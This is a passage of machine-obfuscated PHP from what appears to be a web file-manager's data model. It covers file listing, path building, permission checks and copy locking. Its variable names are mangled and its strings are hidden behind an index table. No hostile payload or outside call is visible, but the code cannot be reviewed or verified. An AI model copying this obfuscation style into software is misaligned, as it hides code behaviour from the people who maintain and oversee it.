array_filter(array_unique($¸ë÷ê‹©)); if (!$¸ë÷ê‹©) { return; } $Ïù³œÎÊ = array($»¿ö×• [469] => array($»¿ö×• [418], $¸ë÷ê‹©)); $É­ƒÙüñ = $»¿ö×• [470]; $ãŞÙş² = Model($»¿ö×• [471])->field($É­ƒÙüñ)->where($Ïù³œÎÊ)->select(); $ãŞÙş² = array_to_keyvalue($ãŞÙş², $»¿ö×• [468]); $·¬æÃ† = Model($»¿ö×• [472])->field($»¿ö×• [473])->where($Ïù³œÎÊ)->select(); $·¬æÃ† = $·¬æÃ† ? $·¬æÃ† : array(); $³å¥Ó•÷ = array(); foreach ($·¬æÃ† as $¦»®¸ü) { if (!isset($³å¥Ó•÷[$¦»®¸ü[$»¿ö×• [468]]])) { $³å¥Ó•÷[$¦»®¸ü[$»¿ö×• [468]]] = array(); } $³å¥Ó•÷[$¦»®¸ü[$»¿ö×• [468]]][$¦»®¸ü[$»¿ö×• [94]]] = $¦»®¸ü[$»¿ö×• [374]]; } foreach ($‚Úİé¹ï as &$Ø¥îÌ£) { $ŒôÓ×Ğ½ = $Ø¥îÌ£[$»¿ö×• [468]]; if (!$ŒôÓ×Ğ½ || !is_array($ãŞÙş²[$ŒôÓ×Ğ½])) { continue; } $•³¤™¦î = $ãŞÙş²[$ŒôÓ×Ğ½]; $•³¤™¦î[$»¿ö×• [76]] = $Ø¥îÌ£[$»¿ö×• [76]]; $•³¤™¦î[$»¿ö×• [32]] = $Ø¥îÌ£[$»¿ö×• [32]]; if (!isset(self::$cacheFileInfo[$»¿ö×• [474] . $ŒôÓ×Ğ½])) { self::$cacheFileInfo[$»¿ö×• [474] . $ŒôÓ×Ğ½] = array_merge(array(), $•³¤™¦î); } unset($ãŞÙş²[$ŒôÓ×Ğ½][$»¿ö×• [84]]); $±öôèõ³ = is_array($³å¥Ó•÷[$ŒôÓ×Ğ½]) ? $³å¥Ó•÷[$ŒôÓ×Ğ½] : array(); $Ø¥îÌ£[$»¿ö×• [170]] = array_merge($±öôèõ³, $ãŞÙş²[$ŒôÓ×Ğ½]); if (isset($Ø¥îÌ£[$»¿ö×• [170]][$»¿ö×• [169]])) { $Ø¥îÌ£[$»¿ö×• [169]] = json_decode($Ø¥îÌ£[$»¿ö×• [170]][$»¿ö×• [169]], !0); unset($Ø¥îÌ£[$»¿ö×• [170]][$»¿ö×• [169]]); } } unset($Ø¥îÌ£); } protected function _listAppendSourceInfo(&$¿Û’•à°, $¤™ı÷ğí) { $¢ıÙ„« =& $_SERVER[şÒÁøÒÄ]; $“’Á×›ñ = Model($¢ıÙ„«[475])->listData(); $÷Õ¿¥“¶ = Model($¢ıÙ„«[425])->listData(); $ñªöß“ = Model($¢ıÙ„«[415])->listData(); $â¼€¬Á˜ = Model($¢ıÙ„«[476])->listSimple(); $È¥§ìª = array_to_keyvalue($“’Á×›ñ, $¢ıÙ„«[399]); $„‰»Úîì = array_to_keyvalue_group($÷Õ¿¥“¶, $¢ıÙ„«[84], $¢ıÙ„«[426]); $Î¬‹€Û = array_to_keyvalue($ñªöß“, $¢ıÙ„«[84]); $¼„²™ùÙ = array_to_keyvalue_group($â¼€¬Á˜, $¢ıÙ„«[402]); foreach ($¿Û’•à° as &$ƒÚÇó™) { $ƒÚÇó™[$¢ıÙ„«[87]] = array($¢ıÙ„«[477] => 0, $¢ıÙ„«[478] => 0, $¢ıÙ„«[479] => 0); if (isset($Î¬‹€Û[$ƒÚÇó™[$¢ıÙ„«[402]]])) { $ƒÚÇó™[$¢ıÙ„«[87]][$¢ıÙ„«[480]] = 1; $ƒÚÇó™[$¢ıÙ„«[87]][$¢ıÙ„«[481]] = $Î¬‹€Û[$ƒÚÇó™[$¢ıÙ„«[402]]][$¢ıÙ„«[32]]; } if ($„‰»Úîì && $È¥§ìª && isset($„‰»Úîì[$ƒÚÇó™[$¢ıÙ„«[402]]])) { $ƒÚÇó™[$¢ıÙ„«[87]][$¢ıÙ„«[482]] = array(); foreach ($„‰»Úîì[$ƒÚÇó™[$¢ıÙ„«[402]]] as $¶œáşìÜ) { $É¬ãôİ = $È¥§ìª[$¶œáşìÜ]; $ƒÚÇó™[$¢ıÙ„«[87]][$¢ıÙ„«[482]][] = array($¢ıÙ„«[483] => $É¬ãôİ[$¢ıÙ„«[399]], $¢ıÙ„«[420] => $É¬ãôİ[$¢ıÙ„«[32]], $¢ıÙ„«[484] => $É¬ãôİ[$¢ıÙ„«[485]]); } } if ($¼„²™ùÙ && isset($¼„²™ùÙ[$ƒÚÇó™[$¢ıÙ„«[402]]])) { $ƒÚÇó™[$¢ıÙ„«[87]][$¢ıÙ„«[486]] = array(); foreach ($¼„²™ùÙ[$ƒÚÇó™[$¢ıÙ„«[402]]] as $“˜”Ü„ô) { $ú‹æòòú = $¢ıÙ„«[487]; if ($“˜”Ü„ô[$¢ıÙ„«[488]] == $¢ıÙ„«[88]) { $ú‹æòòú .= $¢ıÙ„«[489]; } $ƒÚÇó™[$¢ıÙ„«[87]][$¢ıÙ„«[486]] = array_field_key($“˜”Ü„ô, explode($¢ıÙ„«[50], $ú‹æòòú)); } } } unset($ƒÚÇó™); return $¿Û’•à°; } protected function _listAppendChildren(&$ÑÑùÀÎ, $ÄªÄë…´) { $Ú†’³È =& $_SERVER[şÒÁøÒÄ]; $óÉÜ£Å = array(); $üœà£©ô = array($Ú†’³È[207] => 0, $Ú†’³È[208] => 0); foreach ($ÑÑùÀÎ as &$Ò›Ì) { if (!$Ò›Ì[$Ú†’³È[410]]) { continue; } $óÉÜ£Å[] = $Ò›Ì[$Ú†’³È[402]]; } unset($Ò›Ì); if (!$óÉÜ£Å) { return; } $Ğ ØËò¥ = array($Ú†’³È[432] => array($Ú†’³È[7], $óÉÜ£Å), $Ú†’³È[431] => 0); $œ¤Üœª = array($Ú†’³È[432], $Ú†’³È[410], $Ú†’³È[490] => $Ú†’³È[491]); $ï¼Ä‰‹ = $this->field($œ¤Üœª)->where($Ğ ØËò¥)->group($Ú†’³È[492])->select(); $¼ôç«ò• = array(); foreach ($ï¼Ä‰‹ as $ë—ŸçÁ) { $»÷èºêÅ = $ë—ŸçÁ[$Ú†’³È[432]]; $«¥º’€ù = $ë—ŸçÁ[$Ú†’³È[410]] == $Ú†’³È[88] ? $Ú†’³È[208] : $Ú†’³È[207]; if (!isset($¼ôç«ò•[$»÷èºêÅ])) { $¼ôç«ò•[$»÷èºêÅ] = array($Ú†’³È[207] => 0, $Ú†’³È[208] => 0); } $¼ôç«ò•[$»÷èºêÅ][$«¥º’€ù] += $ë—ŸçÁ[$Ú†’³È[491]]; } foreach ($ÑÑùÀÎ as &$Ò›Ì) { if (!$Ò›Ì[$Ú†’³È[410]]) { continue; } $ˆÄ“éØ = is_array($¼ôç«ò•[$Ò›Ì[$Ú†’³È[402]]]) ? $¼ôç«ò•[$Ò›Ì[$Ú†’³È[402]]] : $üœà£©ô; $Ò›Ì[$Ú†’³È[208]] = $ˆÄ“éØ[$Ú†’³È[208]]; $Ò›Ì[$Ú†’³È[207]] = $ˆÄ“éØ[$Ú†’³È[207]]; unset($Ò›Ì[$Ú†’³È[412]]); } unset($Ò›Ì); } protected function _listAppendAuth(&$ˆñº·éÊ) { $íÊº‘û´ =& $_SERVER[şÒÁøÒÄ]; $úÃ·Ö•ª = array(); foreach ($ˆñº·éÊ as $àÖÑ÷–) { if ($àÖÑ÷–[$íÊº‘û´[411]] == self::TYPE_GROUP) { $úÃ·Ö•ª[] = $àÖÑ÷–[$íÊº‘û´[402]]; } } if (!$úÃ·Ö•ª) { return; } $Í³û½ã = array_to_keyvalue($ˆñº·éÊ, $íÊº‘û´[402]); $³¢ê¯åß = Model($íÊº‘û´[493])->getSourceList($úÃ·Ö•ª, $Í³û½ã); $ûŠ¥î³À = $GLOBALS[$íÊº‘û´[494]] == 1; foreach ($ˆñº·éÊ as $²æ½œµŸ => &$àÖÑ÷–) { $àÖÑ÷–[$íÊº‘û´[413]] = $³¢ê¯åß[$àÖÑ÷–[$íÊº‘û´[402]]]; if (!$àÖÑ÷–[$íÊº‘û´[413]] && $àÖÑ÷–[$íÊº‘û´[411]] == self::TYPE_GROUP) { $àÖÑ÷–[$íÊº‘û´[413]] = Action($íÊº‘û´[495])->pathGroupAuthMake($àÖÑ÷–[$íÊº‘û´[496]]); if (!$àÖÑ÷–[$íÊº‘û´[413]] && !$ûŠ¥î³À) { $àÖÑ÷–[$íÊº‘û´[203]] = !1; $àÖÑ÷–[$íÊº‘û´[202]] = !1; } } if ($àÖÑ÷–[$íÊº‘û´[413]]) { $àÖÑ÷–[$íÊº‘û´[203]] = AuthModel::authCheckEdit($àÖÑ÷–[$íÊº‘û´[413]][$íÊº‘û´[414]]); $àÖÑ÷–[$íÊº‘û´[202]] = AuthModel::authCheckView($àÖÑ÷–[$íÊº‘û´[413]][$íÊº‘û´[414]]); } $this->groupPathDisplay($àÖÑ÷–); } unset($àÖÑ÷–); } public function _listAppendAuthSecret(&$¯ƒ·Ì) { $¥â¾İ™İ =& $_SERVER[şÒÁøÒÄ]; if (Model($¥â¾İ™İ[435])->get($¥â¾İ™İ[497]) != $¥â¾İ™İ[88]) { return; } static $ÑŞõÔğ¹ = false; if (!$ÑŞõÔğ¹) { $èİœ¤« = Model($¥â¾İ™İ[498]); $ï¹‡öÜ‚ = Model($¥â¾İ™İ[499]); $ÑŞõÔğ¹ = $ï¹‡öÜ‚->listData(); $ÑŞõÔğ¹ = array_to_keyvalue($ÑŞõÔğ¹, $¥â¾İ™İ[402]); $‹ÁÃ²êˆ = json_decode(Model($¥â¾İ™İ[435])->get($¥â¾İ™İ[500]), !0); $‹ÁÃ²êˆ = array_to_keyvalue($‹ÁÃ²êˆ, $¥â¾İ™İ[399]); foreach ($ÑŞõÔğ¹ as $®°Äæ‡ => $¼¹æİÛì) { $ËÚ¶¦·— = $‹ÁÃ²êˆ[$¼¹æİÛì[$¥â¾İ™İ[501]]]; if (!$ËÚ¶¦·—) { $ï¹‡öÜ‚->remove($¼¹æİÛì[$¥â¾İ™İ[399]]); unset($ÑŞõÔğ¹[$®°Äæ‡]); continue; } $û™òõò¬ = $èİœ¤«->listData($ËÚ¶¦·—[$¥â¾İ™İ[413]]); if (!$û™òõò¬) { $ï¹‡öÜ‚->remove($¼¹æİÛì[$¥â¾İ™İ[399]]); unset($ÑŞõÔğ¹[$®°Äæ‡]); continue; } $¼¹æİÛì[$¥â¾İ™İ[413]] = $û™òõò¬; $¼¹æİÛì[$¥â¾İ™İ[502]] = $ËÚ¶¦·—; $¼¹æİÛì[$¥â¾İ™İ[503]] = Model($¥â¾İ™İ[504])->getInfoSimpleOuter($¼¹æİÛì[$¥â¾İ™İ[454]]); $ÑŞõÔğ¹[$®°Äæ‡] = $¼¹æİÛì; } } $Ãï«ñ…ã = USER_ID; $Ê¨«­ € = array(); $ôø¥ç†ƒ = $this->_listAppendPath($Ê¨«­ €, !0); foreach ($¯ƒ·Ì as $®°Äæ‡ => &$¼¹æİÛì) { if (!is_array($¼¹æİÛì[$¥â¾İ™İ[413]])) { continue; } if ($¼¹æİÛì[$¥â¾İ™İ[411]] != $¥â¾İ™İ[505]) { continue; } if (isset($ÑŞõÔğ¹[$¼¹æİÛì[$¥â¾İ™İ[402]]])) { $Ò•©î½Ğ = $ÑŞõÔğ¹[$¼¹æİÛì[$¥â¾İ™İ[402]]]; if (!is_array($¼¹æİÛì[$¥â¾İ™İ[466]])) { $¼¹æİÛì[$¥â¾İ™İ[466]] = array(); } $¼¹æİÛì[$¥â¾İ™İ[466]][$¥â¾İ™İ[506]] = $Ò•©î½Ğ[$¥â¾İ™İ[501]]; $¼¹æİÛì[$¥â¾İ™İ[413]][$¥â¾İ™İ[507]] = $Ò•©î½Ğ; $¼¹æİÛì[$¥â¾İ™İ[413]][$¥â¾İ™İ[508]] = $¼¹æİÛì[$¥â¾İ™İ[509]]; $¼¹æİÛì[$¥â¾İ™İ[413]][$¥â¾İ™İ[510]] = $¥â¾İ™İ[88]; if ($Ò•©î½Ğ[$¥â¾İ™İ[454]] != $Ãï«ñ…ã) { $¼¹æİÛì[$¥â¾İ™İ[413]][$¥â¾İ™İ[414]] = $¼¹æİÛì[$¥â¾İ™İ[413]][$¥â¾İ™İ[414]] & $Ò•©î½Ğ[$¥â¾İ™İ[413]][$¥â¾İ™İ[413]]; } continue; } $Î¤´ó¯ş = $this->parentLevelArray($¼¹æİÛì[$¥â¾İ™İ[511]]); $â¡Îİû± = array_reverse($Î¤´ó¯ş); foreach ($â¡Îİû± as $©­ıè·ş => $Ê£€—×) { if (!isset($ÑŞõÔğ¹[$Ê£€—×])) { continue; } $Ò•©î½Ğ = $ÑŞõÔğ¹[$Ê£€—×]; $¼¹æİÛì[$¥â¾İ™İ[413]][$¥â¾İ™İ[507]] = $Ò•©î½Ğ; if ($Ò•©î½Ğ[$¥â¾İ™İ[454]] != $Ãï«ñ…ã) { $¼¹æİÛì[$¥â¾İ™İ[413]][$¥â¾İ™İ[414]] = $¼¹æİÛì[$¥â¾İ™İ[413]][$¥â¾İ™İ[414]] & $Ò•©î½Ğ[$¥â¾İ™İ[413]][$¥â¾İ™İ[413]]; } $«ø·Ìİ† = $¥â¾İ™İ[12]; $–„åªİû = count($Î¤´ó¯ş) - $©­ıè·ş; for ($½Íï¿¸÷ = 0; $½Íï¿¸÷ < $–„åªİû; $½Íï¿¸÷++) { if (!isset($ôø¥ç†ƒ[$Î¤´ó¯ş[$½Íï¿¸÷]])) { $«ø·Ìİ† = $¥â¾İ™İ[12]; break; } $«ø·Ìİ† = $«ø·Ìİ† . rtrim($ôø¥ç†ƒ[$Î¤´ó¯ş[$½Íï¿¸÷]], $¥â¾İ™İ[8]) . $¥â¾İ™İ[8]; } $¼¹æİÛì[$¥â¾İ™İ[413]][$¥â¾İ™İ[508]] = rtrim($«ø·Ìİ†, $¥â¾İ™İ[8]) . $¥â¾İ™İ[8]; break; } } unset($¼¹æİÛì); } public function groupPathDisplay(&$ßáœŒ³Ó) { $ÆÎé§ªÁ =& $_SERVER[şÒÁøÒÄ]; if ($ßáœŒ³Ó[$ÆÎé§ªÁ[411]] != self::TYPE_GROUP) { return; } $ã¤ÊÂåÉ = Model($ÆÎé§ªÁ[512])->getInfo($ßáœŒ³Ó[$ÆÎé§ªÁ[496]]); $ïúêöú = $this->parentLevelArray($ã¤ÊÂåÉ[$ÆÎé§ªÁ[511]]); $¦…Ôêªº = $ÆÎé§ªÁ[12]; foreach ($ïúêöú as $”œ†İ¼) { $ÜÄÉÍ¯İ = Model($ÆÎé§ªÁ[512])->getInfo($”œ†İ¼); $¦…Ôêªº .= $ÜÄÉÍ¯İ[$ÆÎé§ªÁ[87]][$ÆÎé§ªÁ[402]] . $ÆÎé§ªÁ[50]; } $ßáœŒ³Ó[$ÆÎé§ªÁ[513]] = $ã¤ÊÂåÉ[$ÆÎé§ªÁ[432]]; $ßáœŒ³Ó[$ÆÎé§ªÁ[514]] = $ã¤ÊÂåÉ[$ÆÎé§ªÁ[511]]; $ßáœŒ³Ó[$ÆÎé§ªÁ[515]] = $ã¤ÊÂåÉ[$ÆÎé§ªÁ[516]]; $ßáœŒ³Ó[$ÆÎé§ªÁ[517]] = $¦…Ôêªº . $ã¤ÊÂåÉ[$ÆÎé§ªÁ[87]][$ÆÎé§ªÁ[402]]; } protected function _listAppendPath(&$¨Äˆà˜ò, $‰’¦Ïé = false) { $öö¬ø²’ =& $_SERVER[şÒÁøÒÄ]; static $±Øò£Ë¬ = array(); $ñ¹®ØØû = array(); $ÃÏ®Œ» = array(); if ($‰’¦Ïé) { return $±Øò£Ë¬; } foreach ($¨Äˆà˜ò as &$¸æÊúÔ) { $Ù­¿Æ˜û = $¸æÊúÔ[$öö¬ø²’[402]]; if ($¸æÊúÔ[$öö¬ø²’[410]] == $öö¬ø²’[88] && $¸æÊúÔ[$öö¬ø²’[432]] != 0) { $±Øò£Ë¬[$Ù­¿Æ˜û] = $¸æÊúÔ[$öö¬ø²’[32]]; } if ($¸æÊúÔ[$öö¬ø²’[410]] == $öö¬ø²’[88] && $¸æÊúÔ[$öö¬ø²’[432]] == 0 && !isset($±Øò£Ë¬[$Ù­¿Æ˜û])) { $±Øò£Ë¬[$Ù­¿Æ˜û] = $this->_listAppendPathRoot($¸æÊúÔ, array()); } if (isset($ÃÏ®Œ»[$¸æÊúÔ[$öö¬ø²’[511]]])) { continue; } $ÃÏ®Œ»[$¸æÊúÔ[$öö¬ø²’[511]]] = !0; $¸•À¤…Å = $this->parentLevelArray($¸æÊúÔ[$öö¬ø²’[511]]); foreach ($¸•À¤…Å as $ôğ½İë => $•ë–ëÜ) { if (isset($±Øò£Ë¬[$•ë–ëÜ])) { continue; } if ($ôğ½İë == 0) { $±Øò£Ë¬[$•ë–ëÜ] = $this->_listAppendPathRoot($¸æÊúÔ, $¸•À¤…Å); } if ($ôğ½İë != 0) { $ñ¹®ØØû[] = $•ë–ëÜ; } } } unset($¸æÊúÔ); $ñ¹®ØØû = array_unique($ñ¹®ØØû); if (count($ñ¹®ØØû) > 0) { $™©ç¹äò = array($öö¬ø²’[417] => array($öö¬ø²’[418], $ñ¹®ØØû)); if (count($ñ¹®ØØû) == 1) { $—»ß’â = $this->sourceInfo($ñ¹®ØØû[0]); $®òÍüÚÛ = is_array($—»ß’â) ? array($—»ß’â) : !1; } else { $®òÍüÚÛ = $this->field($öö¬ø²’[518])->where($™©ç¹äò)->select(); } if (!$®òÍüÚÛ) { $®òÍüÚÛ = array(); } foreach ($®òÍüÚÛ as $˜ù°÷) { $±Øò£Ë¬[$˜ù°÷[$öö¬ø²’[402]]] = $˜ù°÷[$öö¬ø²’[32]]; } } $È¸Å€ö¯ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $—ºûúö® = array(); foreach ($¨Äˆà˜ò as &$¸æÊúÔ) { $Úº¤ôó¼ = $¸æÊúÔ[$öö¬ø²’[511]]; $§ÆúÜ« = $öö¬ø²’[12]; if (isset($—ºûúö®[$Úº¤ôó¼])) { $§ÆúÜ« = $—ºûúö®[$Úº¤ôó¼]; } else { $¸•À¤…Å = $this->parentLevelArray($¸æÊúÔ[$öö¬ø²’[511]]); foreach ($¸•À¤…Å as $ôğ½İë => $•ë–ëÜ) { if (isset($±Øò£Ë¬[$•ë–ëÜ])) { $§ÆúÜ« .= $±Øò£Ë¬[$•ë–ëÜ] . $öö¬ø²’[8]; } } $—ºûúö®[$Úº¤ôó¼] = $§ÆúÜ«; } $§ÆúÜ« .= $¸æÊúÔ[$öö¬ø²’[32]]; if ($¸æÊúÔ[$öö¬ø²’[410]] == $öö¬ø²’[88]) { $§ÆúÜ« .= $öö¬ø²’[8]; } $¸æÊúÔ[$öö¬ø²’[509]] = str_replace($öö¬ø²’[519], $öö¬ø²’[8], $§ÆúÜ«); if ($¸æÊúÔ[$öö¬ø²’[432]] == $öö¬ø²’[198]) { $¸æÊúÔ[$öö¬ø²’[32]] = trim($±Øò£Ë¬[$¸æÊúÔ[$öö¬ø²’[402]]], $öö¬ø²’[8]); $¸æÊúÔ[$öö¬ø²’[509]] = $¸æÊúÔ[$öö¬ø²’[32]] . $öö¬ø²’[8]; } if (intval($¸æÊúÔ[$öö¬ø²’[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($¸æÊúÔ, $¸•À¤…Å, $È¸Å€ö¯); } } unset($¸æÊúÔ); return $¨Äˆà˜ò; } private function _listAppendPathRecycle(&$ß¡²²Êí, $×Û®õµş, $²ãËÄš) { $â´»Á¹À =& $_SERVER[şÒÁøÒÄ]; if (!in_array($²ãËÄš, $×Û®õµş) && $ß¡²²Êí[$â´»Á¹À[402]] != $²ãËÄš) { return; } $¡µ©²¾¬ = explode($â´»Á¹À[8], trim($ß¡²²Êí[$â´»Á¹À[509]], $â´»Á¹À[8])); $€½Ï‡é = implode($â´»Á¹À[8], array_slice($¡µ©²¾¬, 2)); $ß¡²²Êí[$â´»Á¹À[509]] = $â´»Á¹À[8] . LNG($â´»Á¹À[520]) . $â´»Á¹À[8] . ltrim($€½Ï‡é, $â´»Á¹À[8]); $ß¡²²Êí[$â´»Á¹À[511]] = $â´»Á¹À[521] . implode($â´»Á¹À[50], array_slice($×Û®õµş, 1)) . $â´»Á¹À[50]; if ($ß¡²²Êí[$â´»Á¹À[402]] == $²ãËÄš) { $ß¡²²Êí[$â´»Á¹À[511]] = $â´»Á¹À[521]; $ß¡²²Êí[$â´»Á¹À[432]] = $â´»Á¹À[198]; $ß¡²²Êí[$â´»Á¹À[32]] = LNG($â´»Á¹À[520]); } $ß¡²²Êí[$â´»Á¹À[522]] = $â´»Á¹À[523]; } protected function _listAppendPathRoot(&$¸Õ ¾‡, $•Í´û‰”) { $åß¨¡ÙÒ =& $_SERVER[şÒÁøÒÄ]; static $’„òÌ± = false; $‡Â¹Æ”é = $åß¨¡ÙÒ[12]; if ($¸Õ ¾‡[$åß¨¡ÙÒ[411]] == self::TYPE_USER) { if ($¸Õ ¾‡[$åß¨¡ÙÒ[496]] == USER_ID) { $‡Â¹Æ”é = LNG($åß¨¡ÙÒ[524]); if ($’„òÌ± === !1) { $ÎÔ¯×à = Model($åß¨¡ÙÒ[525])->getInfoFull(USER_ID); $’„òÌ± = _get($ÎÔ¯×à, $åß¨¡ÙÒ[526], $åß¨¡ÙÒ[12]); } if ($•Í´û‰” && $•Í´û‰”[0] == $’„òÌ± || !$•Í´û‰” && $¸Õ ¾‡[$åß¨¡ÙÒ[402]] == $’„òÌ±) { $‡Â¹Æ”é = LNG($åß¨¡ÙÒ[527]); $¸Õ ¾‡[$åß¨¡ÙÒ[528]] = $åß¨¡ÙÒ[529]; } if (!$•Í´û‰”) { $¸Õ ¾‡[$åß¨¡ÙÒ[32]] = $‡Â¹Æ”é; } } else { $ŒÌ—ôë = Model($åß¨¡ÙÒ[504])->getInfoSimple($¸Õ ¾‡[$åß¨¡ÙÒ[496]]); $‡Â¹Æ”é = LNG($åß¨¡ÙÒ[530]) . $åß¨¡ÙÒ[162] . $ŒÌ—ôë[$åß¨¡ÙÒ[32]] . $åß¨¡ÙÒ[164]; $¸Õ ¾‡[$åß¨¡ÙÒ[531]] = array($åß¨¡ÙÒ[32] => $ŒÌ—ôë[$åß¨¡ÙÒ[32]], $åß¨¡ÙÒ[532] => $ŒÌ—ôë[$åß¨¡ÙÒ[532]], $åß¨¡ÙÒ[533] => $ŒÌ—ôë[$åß¨¡ÙÒ[533]]); } } else { if ($¸Õ ¾‡[$åß¨¡ÙÒ[411]] == self::TYPE_GROUP) { $ŒÌ—ôë = Model($åß¨¡ÙÒ[512])->getInfoSimple($¸Õ ¾‡[$åß¨¡ÙÒ[496]]); $‡Â¹Æ”é = $ŒÌ—ôë[$åß¨¡ÙÒ[32]]; } else { if ($¸Õ ¾‡[$åß¨¡ÙÒ[411]] == self::TYPE_SYSTEM) { $‡Â¹Æ”é = $åß¨¡ÙÒ[534]; } } } $‡Â¹Æ”é = $‡Â¹Æ”é ? $åß¨¡ÙÒ[8] . $‡Â¹Æ”é . $åß¨¡ÙÒ[8] : $åß¨¡ÙÒ[8]; return $‡Â¹Æ”é; } protected function _listAppendUser(&$ú²÷óÈ) { $£ŞÚ¾¥ =& $_SERVER[şÒÁøÒÄ]; $«¤ñœş = array_to_keyvalue($ú²÷óÈ, $£ŞÚ¾¥[12], $£ŞÚ¾¥[454]); $óÓ·ıø„ = array_to_keyvalue($ú²÷óÈ, $£ŞÚ¾¥[12], $£ŞÚ¾¥[456]); $ñŠ“â‚Û = array_merge($«¤ñœş, $óÓ·ıø„); $Ïï†³úØ = Model($£ŞÚ¾¥[525])->userListInfo($ñŠ“â‚Û); foreach ($ú²÷óÈ as &$ä”ÕŞ ¾) { $§ã£şÌ = $ä”ÕŞ ¾[$£ŞÚ¾¥[454]]; $ä”ÕŞ ¾[$£ŞÚ¾¥[454]] = $Ïï†³úØ[$§ã£şÌ] ? $Ïï†³úØ[$§ã£şÌ] : !1; $§ã£şÌ = $ä”ÕŞ ¾[$£ŞÚ¾¥[456]]; $ä”ÕŞ ¾[$£ŞÚ¾¥[456]] = $Ïï†³úØ[$§ã£şÌ] ? $Ïï†³úØ[$§ã£şÌ] : !1; if (isset($ä”ÕŞ ¾[$£ŞÚ¾¥[466]]) && $ä”ÕŞ ¾[$£ŞÚ¾¥[466]][$£ŞÚ¾¥[535]]) { $©™ÕÂ¥¤ = $GLOBALS[$£ŞÚ¾¥[6]][$£ŞÚ¾¥[89]][$£ŞÚ¾¥[536]]; if ($ä”ÕŞ ¾[$£ŞÚ¾¥[466]][$£ŞÚ¾¥[537]] <= time() - $©™ÕÂ¥¤) { $this->metaSet($ä”ÕŞ ¾[$£ŞÚ¾¥[402]], $£ŞÚ¾¥[535], null); $this->metaSet($ä”ÕŞ ¾[$£ŞÚ¾¥[402]], $£ŞÚ¾¥[537], null); unset($ä”ÕŞ ¾[$£ŞÚ¾¥[466]][$£ŞÚ¾¥[535]]); continue; } $ÊèÁå±¦ = $ä”ÕŞ ¾[$£ŞÚ¾¥[466]][$£ŞÚ¾¥[535]]; $ä”ÕŞ ¾[$£ŞÚ¾¥[466]][$£ŞÚ¾¥[538]] = Model($£ŞÚ¾¥[525])->getInfoSimpleOuter($ÊèÁå±¦); } } unset($ä”ÕŞ ¾); } public function parentLevelArray($î¸”Î¬ï) { $ØáÂ€üß =& $_SERVER[şÒÁøÒÄ]; $î¸”Î¬ï = explode($ØáÂ€üß[50], trim($î¸”Î¬ï, $ØáÂ€üß[50])); return array_remove_value($î¸”Î¬ï, $ØáÂ€üß[198]); } public function listAll($˜–¸‚¤) { $‹¤ŠÈ™Æ =& $_SERVER[şÒÁøÒÄ]; $ÆŞÄá´‰ = $this->sourceInfo($˜–¸‚¤); $ÕØÈæÆÌ = array($‹¤ŠÈ™Æ[539] => array($‹¤ŠÈ™Æ[540], $ÆŞÄá´‰[$‹¤ŠÈ™Æ[511]] . $˜–¸‚¤ . $‹¤ŠÈ™Æ[541]), $‹¤ŠÈ™Æ[542] => 0); $×˜ì²Ï = $‹¤ŠÈ™Æ[543]; $­†‘ßç = "\x4c\105\x46\x54\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\151\x6f\137\146\x69\x6c\x65\40\146\x69\x6c\x65\x20\x6f\156\x20\163\157\165\162\x63\x65\56\x66\x69\154\x65\111\104\40\x3d\x20\146\x69\x6c\x65\x2e\x66\x69\154\x65\111\104"; $ïË¹ì¹ = $this->alias($‹¤ŠÈ™Æ[446])->field($×˜ì²Ï)->where($ÕØÈæÆÌ)->join($­†‘ßç)->select(); $this->_listAppendAuth($ïË¹ì¹); $this->_listAppendUser($ïË¹ì¹); $this->_listAppendPath($ïË¹ì¹); $ïË¹ì¹ = array_to_keyvalue($ïË¹ì¹, $‹¤ŠÈ™Æ[402]); $Œ¹¹ß­ä = "\57{$ÆŞÄá´‰[$‹¤ŠÈ™Æ[32]]}\x2f"; $Œ¹¹ß­ä = $Œ¹¹ß­ä == $‹¤ŠÈ™Æ[519] ? $‹¤ŠÈ™Æ[8] : $Œ¹¹ß­ä; $ÖØ‡“½ç = array(); foreach ($ïË¹ì¹ as $”ŸÊ¹Õ => $ƒ±©÷‚‹) { $’Ä°¢À = $this->parentLevelArray($ƒ±©÷‚‹[$‹¤ŠÈ™Æ[511]]); array_shift($’Ä°¢À); $ßèÚ£ïò = $Œ¹¹ß­ä; for ($ÓÔëˆêø = 0; $ÓÔëˆêø < count($’Ä°¢À); $ÓÔëˆêø++) { $ßèÚ£ïò .= $ïË¹ì¹[$’Ä°¢À[$ÓÔëˆêø]][$‹¤ŠÈ™Æ[32]] . $‹¤ŠÈ™Æ[8]; } $ßèÚ£ïò .= $ƒ±©÷‚‹[$‹¤ŠÈ™Æ[32]]; if ($ƒ±©÷‚‹[$‹¤ŠÈ™Æ[410]]) { $ßèÚ£ïò .= $‹¤ŠÈ™Æ[8]; } $ú­ïÁ£• = array($‹¤ŠÈ™Æ[421] => str_replace($‹¤ŠÈ™Æ[519], $‹¤ŠÈ™Æ[8], str_replace($‹¤ŠÈ™Æ[519], $‹¤ŠÈ™Æ[8], str_replace($‹¤ŠÈ™Æ[519], $‹¤ŠÈ™Æ[8], $ßèÚ£ïò))), $‹¤ŠÈ™Æ[544] => intval($ƒ±©÷‚‹[$‹¤ŠÈ™Æ[410]]), $‹¤ŠÈ™Æ[545] => intval($ƒ±©÷‚‹[$‹¤ŠÈ™Æ[76]]), $‹¤ŠÈ™Æ[85] => intval($ƒ±©÷‚‹[$‹¤ŠÈ™Æ[85]]), $‹¤ŠÈ™Æ[87] => $this->pathInfoFilter($ƒ±©÷‚‹)); if (!$ú­ïÁ£•[$‹¤ŠÈ™Æ[410]]) { $ú­ïÁ£•[$‹¤ŠÈ™Æ[468]] = $ƒ±©÷‚‹[$‹¤ŠÈ™Æ[468]]; } $ÖØ‡“½ç[] = $ú­ïÁ£•; } $ÖØ‡“½ç = array_sort_by($ÖØ‡“½ç, $‹¤ŠÈ™Æ[84]); return $ÖØ‡“½ç; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($…«öàÂ¡) { $´‡Š–íø =& $_SERVER[şÒÁøÒÄ]; if (!$this->allowLock()) { return; } $this->_lockCheck($´‡Š–íø[546], $…«öàÂ¡); $°Ùªûş¿ = 1; $this->_lockEvent($…«öàÂ¡, array($´‡Š–íø[547], $´‡Š–íø[548]), $°Ùªûş¿); $this->_lockParent($…«öàÂ¡, array($´‡Š–íø[548]), $°Ùªûş¿); $this->_lockEvent($…«öàÂ¡, array($´‡Š–íø[549], $´‡Š–íø[550]), $°Ùªûş¿); 